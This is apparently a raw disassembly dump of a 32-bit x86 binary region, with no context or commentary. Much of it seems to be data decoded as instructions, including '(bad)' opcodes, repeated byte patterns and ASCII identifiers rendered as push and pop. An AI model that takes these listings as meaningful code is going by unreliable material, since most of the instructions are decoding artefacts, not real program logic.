  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	fisttp QWORD PTR ds:0x478a1014
  43395e:	add    cl,BYTE PTR [edx-0x43]
  433961:	xchg   esi,eax
  433962:	mov    ch,0xee
  433964:	inc    ebp
  433965:	push   ss
  433966:	sbb    ah,BYTE PTR [ebp+0x1b]
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
